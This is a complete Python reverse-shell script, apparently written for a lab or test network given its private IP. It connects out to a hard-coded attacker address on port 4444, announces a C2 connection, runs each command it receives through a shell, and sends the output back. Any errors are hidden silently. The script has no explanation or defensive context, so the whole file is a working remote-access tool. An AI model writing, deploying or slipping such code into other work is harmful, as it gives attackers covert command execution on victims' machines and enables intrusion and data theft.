#!/usr/bin/env python3
import socket, subprocess, os, time

ATTACKER_IP = '172.20.0.10'
ATTACKER_PORT = 4444

def start_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(b"[+] C2 Connection Established\n$ ")
        while True:
            data = s.recv(1024)
            if not data or data.strip().lower() == b'exit':
                break
            cmd = data.decode('utf-8', errors='ignore')
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output + b"$ ")
        s.close()
    except Exception as e:
        pass

if __name__ == '__main__':
    start_shell()
